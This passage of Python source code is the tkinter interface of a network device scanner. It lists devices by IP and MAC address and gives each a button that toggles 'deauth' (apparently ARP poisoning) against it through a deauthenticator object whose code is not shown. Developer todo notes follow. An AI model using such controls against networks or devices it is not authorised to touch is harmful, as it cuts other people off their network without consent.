        info_frame_ip.pack(expand=YES, fill=BOTH, side=LEFT)

        # mac
        info_frame_mac = Label(
            info_frame_bottom,
            relief=self.relief,
            font=self.mono_medium,
            text=mac.center(20),
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
        )
        info_frame_mac.pack(expand=YES, fill=BOTH, side=LEFT)

        # Label (visible status)
        status_label = Label(
            row,
            relief=self.relief,
            font=self.mono_small,
            # text=" ACTIVE ",
            text=visible_text,
            bg=visible_color,
        )
        status_label.pack(expand=NO, fill=BOTH, side=LEFT)

        # Label (deauth status)
        deauth_label = Label(
            row,
            relief=self.relief,
            font=self.mono_small,
            text=" DEAUTH \n STATUS ",
            bg=self.deauth_positive_color,
        )
        deauth_label.pack(expand=NO, fill=BOTH, side=LEFT)

        # Button for some action
        deauth_button = Button(
            row,
            font=self.mono_medium,
            text=self.deauth_button_deauth_text,
            command=lambda q=mac: self.switch_deauth_mode(q),
            bg=self.widgets_bg_color,
            fg=self.widgets_fg_color,
            justify="center",
        )
        deauth_button.pack(expand=NO, fill=BOTH, side=LEFT)

        self.rows_widgets[mac] = {
            "row_wrapper": row_wrapper,
            "row": row,
            "remove_client_button": remove_client_button,
            "client_name_entry": client_name_entry,
            "status_label": status_label,
            "info_frame_device": info_frame_device,
            "info_frame_ip": info_frame_ip,
            "info_frame_mac": info_frame_mac,
            "deauth_label": deauth_label,
            "deauth_button": deauth_button,
            "image_label": image_label,
        }
        return None

    def remove_client(self, mac):
        """remove client specified by mac
        things to remove:
            -widget (pack_forget) +
            -self.rows_widgets item (pop) +
            -self.table item +
            -clear deauth status +
            -matcher dict item
        """
        # ************** remove client from matcher **************
        self.matcher.remove_client(mac)

        # ************** remove table item **************
        self.table = [
            (name, vendor, ip, table_mac, visible)
            for (name, vendor, ip, table_mac, visible) in self.table
            if not table_mac == mac
        ]

        # ************** clear deauth **************
        ip = self.mac_ip_matching[mac]
        self.deauthenticator.switch_client(mac, ip, False)

        # ************** pack_forget widget **************
        current_row_widgets = self.rows_widgets.get(mac, False)
        row_wrapper_widget = current_row_widgets.get("row_wrapper")
        row_wrapper_widget.pack_forget()
        self.rows_widgets.pop(mac)
        print(colored("[!] row unpacked for: {}".format(mac), self.color))
        return None

    def switch_deauth_mode(self, victim_mac):
        """switch button"""
        # ************** gui update **************
        self.deauth_status[victim_mac] = not self.deauth_status[victim_mac]
        status = self.deauth_status[victim_mac]
        current_row = self.rows_widgets.get(victim_mac, False)
        deauth_label = current_row.get("deauth_label")
        deauth_button = current_row.get("deauth_button")

        if status:
            deauth_label_bg_color = self.deauth_negative_color
            deauth_button_text = self.deauth_button_restore_text
        else:
            deauth_label_bg_color = self.deauth_positive_color
            deauth_button_text = self.deauth_button_deauth_text

        deauth_label.config(bg=deauth_label_bg_color)
        deauth_button.config(text=deauth_button_text)

        # ************** data for deatuch object **************
        victim_ip = self.mac_ip_matching[victim_mac]
        print(
            colored(
                "[*] client to deauth -> ({}, {})".format(victim_mac, victim_ip),
                self.color,
            )
        )
        self.deauthenticator.switch_client(victim_mac, victim_ip, status)
        return None

    def update_row(self, row):
        """update row for specified mac address
        visible status (+)
        ip address (+)
        name (-); is changed in gui and then passed to matcher, so its no need to update it again
        ame, vendor, ip, mac, visible = row
        """
        _, _, ip, mac, visible = row
        current_row = self.rows_widgets.get(mac, False)

        # ******* visible status ******
        status_label = current_row.get("status_label")
        visible_color = self.color_by_status(visible)
        status_label.config(bg=visible_color)
        visible_text = self.active_text_by_status(visible)
        status_label.config(text=visible_text)

        # ******* ip (if different) ******
        info_frame_ip = current_row.get("info_frame_ip")
        if ip != info_frame_ip.cget("text").strip():
            print(
                "[*] ip updated from {} to {}".format(
                    info_frame_ip.cget("text").strip(), ip
                )
            )
            info_frame_ip.config(text=ip.center(15))
        return None

    def pass_print_table(self, table):
        """receive info about data to print
        table -> list of rows
        gui_row -> (name, vendor, ip, mac, visible)
        """
        self.table = table

        # ****** update clients definitions ******
        for (_, _, ip, mac, _) in self.table:
            self.mac_ip_matching[mac] = ip
        return None

    def on_closing(self):
        """handle closing; https://stackoverflow.com/questions/111155/how-do-i-handle-the-window-close-event-in-tkinter"""
        self.hold_thread = True
        self.scanner.hold_thread = True
        self.deauthenticator.hold_thread = True

        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            # ****** save config data ******
            self.config["height"] = self.master.winfo_height()
            self.config["width"] = self.master.winfo_width()
            write_json(self.config_file, self.config)

            # ****** destroy main app ******
            # https://stackoverflow.com/questions/26168967/invalid-command-name-while-executing-after-script
            # http://web.archive.org/web/20201112030233/http://effbot.org/tkinterbook/widget.htm
            # If you have a manual quit button, you can use the after_cancel() method
            # to cancel an after method before calling root.destroy() to kill your program
            # example: id = w.after(time, callback)
            self.master.after_cancel(self.after_id)
            self.master.destroy()

            # ****** save matcher data ******
            self.matcher.pass_data({})

            # ****** join threads etc ******
            self.scanner.join_thread_method()
            print(colored("[*] scanner thread joined", self.color))
            self.deauthenticator.join_thread_method()
            print(colored("[*] deauthenticator thread joined", self.color))

        else:
            # ****** release threads ******
            self.hold_thread = False
            self.scanner.hold_thread = False
            self.deauthenticator.hold_thread = False
        return None

    def entry_callback(self, mac, event):
        """entries callback"""
        entry_widget = self.entries[mac]
        entry_text = entry_widget.get()
        last_name = self.clients_names.get(mac, "")
        if last_name != entry_text:
            # ****** update image ******
            image_label = self.rows_widgets.get(mac).get("image_label")
            img = self.get_proper_image(entry_text)
            image_label.config(image=img)
            image_label.image = img
            image_label.name = entry_text

            # ****** send new nameto matcher ******
            self.matcher.name_update({mac: entry_text})

        self.master.focus()
        return None

    def get_proper_image(self, name):
        """get proper image, for specified name; if image does not exists, draw circle"""
        pairs = {
            "router": "router.png",
            "pc": "pc.png",
            "laptop": "laptop.png",
            "phone": "phone.png",
            "watch": "watch.png",
            "raspberry": "raspberry.png",
            "sound_off": "sound_off.png",
            "sound_on": "sound_on.png",
            "night_mode": "night_mode.png",
            "day_mode": "day_mode.png",
            "circle": "circle.png",
        }

        # must be in this way for now
        img_file = pairs["circle"]
        for key, value in pairs.items():
            if key in name.lower():
                img_file = value
                break

        try:
            img_path = static_file_path("images", img_file)
            img = Image.open(img_path)

        except FileNotFoundError:
            # draw circle 32x32 px
            img = Image.new("RGBA", (32, 32))
            draw = ImageDraw.Draw(img)
            draw.ellipse((0, 0, 31, 31), outline="black", width=1)

        # swap image color, to fit current night mode
        if self.swap_image_color:
            if img.mode == "RGBA":
                r_origin, g_origin, b_origin, a_origin = img.split()
                rgb_image = Image.merge("RGB", (r_origin, g_origin, b_origin))
                inverted_image = ImageOps.invert(rgb_image)
                r_inv, g_inv, b_inv = inverted_image.split()
                img = Image.merge("RGBA", (r_inv, g_inv, b_inv, a_origin))
            else:
                img = ImageOps.invert(img)

        img.thumbnail((32, 32), Image.ANTIALIAS)
        img = ImageTk.PhotoImage(img)
        return img

    def set_night_mode_attributes(self):
        """set attributes depend on night mode status"""
        # ~ bg_dark_color, bg_bright_color = "black", "#d4d4ca"
        # bg_dark_color, bg_bright_color = "black", "#ddddd2"
        bg_dark_color, bg_bright_color, = (
            "black",
            self.original_color,
        )
        fg_dark_color, fg_bright_color = "black", "yellow"
        # entry_bright_color, entry_dark_color = "white", "grey"    # todo

        if self.config["night"]:
            self.night_mode_image = "night_mode"
            self.widgets_bg_color = bg_dark_color
            self.widgets_fg_color = fg_bright_color
            self.swap_image_color = True
        else:
            self.night_mode_image = "day_mode"
            self.widgets_bg_color = bg_bright_color
            self.widgets_fg_color = fg_dark_color
            self.swap_image_color = False
        return None

    def switch_night_mode(self):
        """switch night mode"""
        self.config["night"] = not self.config["night"]
        self.config["height"] = self.master.winfo_height()
        self.config["width"] = self.master.winfo_width()
        write_json(self.config_file, self.config)

        self.set_night_mode_attributes()
        self.master.configure(background=self.widgets_bg_color)

        # ******** switch topbar color ********
        for key, value in self.top_widgets.items():
            if key == "night_mode":
                img = self.get_proper_image(self.night_mode_image)
                value.config(image=img)
                value.image = img
            elif key == "sound_mode":
                img = self.get_proper_image(self.sound_mode_image)
                value.config(image=img)
                value.image = img
            elif key == "vertical_scrolled_frame":
                # ~ canvas has only background
                value.canvas.config(bg=self.widgets_bg_color)
                continue
            else:
                pass
            value.config(bg=self.widgets_bg_color, fg=self.widgets_fg_color)

        # ******** switch rows color ********
        items_to_color = (
            "remove_client_button",
            "client_name_entry",
            "info_frame_device",
            "info_frame_ip",
            "info_frame_mac",
            "deauth_button",
            "image_label",
        )
        for key, value in self.rows_widgets.items():
            name = value["image_label"].name
            img = self.get_proper_image(name)
            value["image_label"].config(image=img)
            value["image_label"].image = img

            for item in items_to_color:
                value[item].config(bg=self.widgets_bg_color, fg=self.widgets_fg_color)
        return None

    def switch_sound_mode(self):
        """switch sound mode"""
        self.config["sound"] = not self.config["sound"]
        write_json(self.config_file, self.config)

        if self.config["sound"]:
            self.sound_mode_image = "sound_on"
        else:
            self.sound_mode_image = "sound_off"

        img = self.get_proper_image(self.sound_mode_image)
        top_sound_mode_button = self.top_widgets["sound_mode"]
        top_sound_mode_button.config(image=img)
        top_sound_mode_button.image = img
        return None

    @staticmethod
    def hide_console():
        """hide console window"""
        if os.name == "nt":
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0
            )
        return None


def scanner_cli():
    """commandline entry point"""
    if os.name == "nt":
        os.system("color")

    # ******** objects ********
    matcher = DevicesMatcher()
    gui = GuiClass(master=Tk())
    scanner = ScannerClass(debug=False)
    deauthenticator = DeauthClass(debug=False)

    # ******** relations ********
    scanner.matcher = matcher
    scanner.deauthenticator = deauthenticator
    matcher.gui_object = gui
    gui.matcher = matcher
    gui.scanner = scanner
    gui.deauthenticator = deauthenticator

    # ******** run ********
    scanner.run()
    gui.mainloop()
    return None


if __name__ == "__main__":
    script_path()
    scanner_cli()


"""
26.05.2020, todo:
	fix widgets positions (padx, pady, etc)
	add frame for main rows
	add scrollbar for frame with rows
	make "night-mode-button" functional (+)
	consider replacing topbar label (images) and buttons, to buttons with images (+)
	add entries for timings in topbar (minimal time for visible, searching time)
	think of scapy slow import
	fix gui (with changes above), to work on linux
	log users activity, to file, in the following format, line by line:
        <current time>, <client mac>, <True/False>
	think of scanning for open ports
	make info about device (vendor, ip, mac) possible to copy
	define device type, by vendor, if not specified by user
	add bar with info about columns:
	DEVICE_TYPE, NAME, INFO, VISIBLE, DEAUTH, DEAUTH_CONTROLL
	think of early warning system, if device is seen
	consider splitting main class, into three independend (gui, search_clients, deauth)
	provide handle for searching gateway_ip and gateway_mac (independend of interface)
	store config files in package files directory
    
13.06.2021
wrapping text in tkinter label:
    https://stackoverflow.com/questions/11949391/how-do-i-use-tkinter-to-create-line-wrapped-text-that-fills-the-width-of-the-win
    welcomenote = Label(root, text="Your long text", font="helvetica 14", 
    wraplength=300, justify="center")
    welcomenote.pack()
    
justify text in entry widget:
    https://stackoverflow.com/questions/14386113/python-ttk-entry-how-to-center-the-input
    e = ttk.Entry(master, ..., justify='center')
    
row by row different color

queue for writing to json file?

threading errors:
    https://stackoverflow.com/questions/14694408/runtimeerror-main-thread-is-not-in-main-loop
    
info:
    mainloop wasn't executed

image and/or text on button:
    https://www.geeksforgeeks.org/python-add-image-on-a-tkinter-button/

08.07.2021
    -there may be problems with deauth poison/restore - for now status is not stored on gui side, only switching
    
11.07.2021:
    -problem to solve:
        https://gist.github.com/novel-yet-trivial/3eddfce704db3082e38c84664fc1fdf8
        This has been a huge help.
        How do I resize the inner frame to be the same width as the outer frame? I have tried assigning different widths in the VerticalScrolledFrame constructor and in self.inner, but the only way I have been able to get the inner frame width to match the outer has been to resize the outer one.
        EDIT:
        According to winfo_width() for the self.canvas, its window, and self.inner, I am able to resize them using a configure-type binding event on self.outer, but the widgets inside of self.inner do not resize along with everything else.
    -think of canvas_dynamically.py on_resize method
    -

26.03.2022:
    -tkinter vs tkinter.ttk widgets
        https://stackoverflow.com/questions/19561727/what-is-the-difference-between-the-widgets-of-tkinter-and-tkinter-ttk-in-python
        https://discuss.python.org/t/tkinter-support-scrollbar-look-modification/7189
        https://www.geeksforgeeks.org/python-add-style-to-tkinter-button/
    -https://dev.to/zeyu2001/network-scanning-with-scapy-in-python-3off
    -
    
"""
